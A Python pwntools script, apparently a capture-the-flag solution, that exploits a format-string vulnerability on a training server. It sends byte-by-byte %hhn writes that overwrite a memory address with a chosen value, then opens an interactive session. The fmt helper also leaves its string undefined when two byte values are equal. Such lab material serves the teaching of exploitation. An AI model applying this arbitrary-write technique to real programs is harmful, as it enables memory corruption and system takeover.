#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "training.angelboy.tw"
port = 11008


r = remote(host,port)

def fmt(prev,word,index):
    if prev < word :
        result = word - prev 
        fmtstr = "%" + str(result) + "c"
    elif prev == word :
        result = 0
    else :
        result = 256 - prev + word
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

magic = 0x804a038
payload = p32(magic)
payload += p32(magic+1)
payload += p32(magic+2)
payload += p32(magic+3)
targat = 0xfaceb00c

prev = 4*4
for i in range(4):
    payload += fmt(prev,(targat >> 8*i) & 0xff,7+i)
    prev = (targat >> 8*i) & 0xff

r.recvuntil(":")
r.sendline(payload)

r.interactive()
